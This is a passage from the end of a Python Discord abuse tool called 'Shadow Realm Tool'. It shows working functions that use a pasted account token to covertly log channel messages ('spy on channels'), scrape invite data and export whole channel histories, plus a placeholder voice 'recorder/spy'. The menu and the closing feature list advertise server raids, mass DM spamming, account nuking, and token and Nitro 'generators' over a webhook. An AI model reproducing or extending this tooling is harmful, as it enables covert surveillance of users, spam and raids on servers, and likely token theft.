                                timestamp = msg.get('timestamp', '')
                                author = msg.get('author', {}).get('username', 'Unknown')
                                content = msg.get('content', '')
                                
                                log_line = f"[{timestamp}] {author}: {content}\n"
                                f.write(log_line)
                                f.flush()
                                log(f"Logged message from {author}", "success")
                    
                    time.sleep(2)
                except:
                    pass
    except KeyboardInterrupt:
        log(f"Message logger stopped - Log saved to {filename}", "warning")
    
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# NEW FEATURE 4: Invite Tracker
def invite_tracker():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(15) INVITE TRACKER")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    guild_id = input(f"{CYAN}[>]{WHITE} Enter Server ID: {RESET}").strip()
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log("Fetching invite data...", "info")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    try:
        invites = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/invites', headers=headers).json()
        
        if not isinstance(invites, list):
            log("Failed to fetch invites - Check permissions!", "error")
            input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
            return
        
        print(f"\n{CYAN}═══════════════════════════════════════════════════════════════════════════")
        print(f"{BLUE}INVITE TRACKER - {len(invites)} Invites Found")
        print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        for inv in invites:
            code = inv.get('code', 'N/A')
            uses = inv.get('uses', 0)
            inviter = inv.get('inviter', {}).get('username', 'Unknown')
            channel = inv.get('channel', {}).get('name', 'Unknown')
            
            log(f"Code: {code} | Uses: {uses} | By: {inviter} | Channel: {channel}", "info")
        
        log("Invite tracking complete!", "success")
        
    except Exception as e:
        log(f"Error fetching invites: {str(e)}", "error")
    
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# NEW FEATURE 5: Message Backup/Export
def message_backup():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(16) MESSAGE BACKUP / EXPORT")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    token = input(f"{CYAN}[>]{WHITE} Enter Discord Token: {RESET}").strip()
    channel_id = input(f"{CYAN}[>]{WHITE} Enter Channel ID to Backup: {RESET}").strip()
    try:
        limit = int(input(f"{CYAN}[>]{WHITE} How many messages to backup? (max 1000): {RESET}").strip())
        if limit > 1000:
            limit = 1000
    except:
        limit = 100
    
    format_type = input(f"{CYAN}[>]{WHITE} Export format (txt/json): {RESET}").strip().lower()
    if format_type not in ['txt', 'json']:
        format_type = 'txt'
    
    if not validate_token(token):
        log("Invalid Discord token!", "error")
        input(f"\n{YELLOW}Press ENTER to continue...{RESET}")
        return
    
    log(f"Fetching {limit} messages...", "info")
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    try:
        all_messages = []
        last_id = None
        
        while len(all_messages) < limit:
            url = f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=100"
            if last_id:
                url += f"&before={last_id}"
            
            msgs = requests.get(url, headers=headers).json()
            
            if not isinstance(msgs, list) or len(msgs) == 0:
                break
            
            all_messages.extend(msgs)
            last_id = msgs[-1]['id']
            log(f"Fetched {len(all_messages)} messages...", "info")
            time.sleep(1)
        
        all_messages = all_messages[:limit]
        
        filename = f"backup_{channel_id}.{format_type}"
        
        if format_type == 'json':
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(all_messages, f, indent=2, ensure_ascii=False)
        else:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"=== Channel Backup: {channel_id} ===\n")
                f.write(f"=== Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"=== Total Messages: {len(all_messages)} ===\n\n")
                
                for msg in reversed(all_messages):
                    timestamp = msg.get('timestamp', '')
                    author = msg.get('author', {}).get('username', 'Unknown')
                    content = msg.get('content', '')
                    f.write(f"[{timestamp}] {author}: {content}\n")
        
        log(f"Backup complete! Saved to {filename}", "success")
        
    except Exception as e:
        log(f"Error during backup: {str(e)}", "error")
    
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# NEW FEATURE 6: VC Recorder
def vc_recorder():
    banner()
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════")
    print(f"                           {BLUE}(17) VC RECORDER / SPY")
    print(f"{CYAN}═══════════════════════════════════════════════════════════════════════════{RESET}\n")
    
    log("VC Recorder requires additional setup:", "warning")
    log("1. Install: pip install discord.py-self", "info")
    log("2. This feature uses voice gateway connections", "info")
    log("3. Recording may violate Discord ToS - use at your own risk!", "warning")
    
    print(f"\n{YELLOW}This feature is complex and requires discord.py-self library.{RESET}")
    print(f"{YELLOW}Due to complexity, this is a placeholder. Would need full voice implementation.{RESET}\n")
    
    log("Feature coming in future update!", "info")
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Main loop
def main():
    while True:
        menu()
        choice = input(f"{CYAN}[>]{WHITE} Select option: {RESET}").strip()
        
        if choice == "1":
            mass_dm()
        elif choice == "2":
            server_raid()
        elif choice == "3":
            token_gen()
        elif choice == "4":
            nitro_gen()
        elif choice == "5":
            status_rotator()
        elif choice == "6":
            auto_responder()
        elif choice == "7":
            dm_spammer()
        elif choice == "8":
            profile_cloner()
        elif choice == "9":
            reaction_nuker()
        elif choice == "10":
            server_analytics()
        elif choice == "11":
            account_nuker()
        elif choice == "12":
            game_activity()
        elif choice == "13":
            giveaway_sniper()
        elif choice == "14":
            message_logger()
        elif choice == "15":
            invite_tracker()
        elif choice == "16":
            message_backup()
        elif choice == "17":
            vc_recorder()
        elif choice == "18":
            clear()
            print(f"{CYAN}╔════════════════════════════════════════════╗")
            print(f"║  Thanks for using Shadow Realm Tool!              ║")
            print(f"║  Made by {MAGENTA}@DarkKnight{CYAN}                          ║")
            print(f"╚════════════════════════════════════════════╝{RESET}\n")
            break
        else:
            log("Invalid option!", "error")
            time.sleep(1)

if __name__ == "__main__":
    main()

"""
═══════════════════════════════════════════════════════════════════════════════
COMPLETE Shadow Realm TOOL - 17 FEATURES

ORIGINAL FEATURES:
✅ (01) Mass DM
✅ (02) Server Raid
✅ (03) Token Generator (webhook)
✅ (04) Nitro Generator (webhook)
✅ (05) Status Rotator
✅ (06) Auto Responder
✅ (07) DM Spammer
✅ (08) Profile Cloner
✅ (09) Reaction Nuker
✅ (10) Server Analytics
✅ (11) Account Nuker

NEW FEATURES ADDED:
✅ (12) Game Activity Changer - Set custom playing/streaming status
✅ (13) Giveaway Sniper - Auto-react to giveaways instantly
✅ (14) Message Logger - Spy on channels and log to file
✅ (15) Invite Tracker - See all server invites and usage stats
✅ (16) Message Backup - Export entire channel history
✅ (17) VC Recorder - Voice channel recording (placeholder)
✅ (18) Exit


═══════════════════════════════════════════════════════════════════════════════
"""
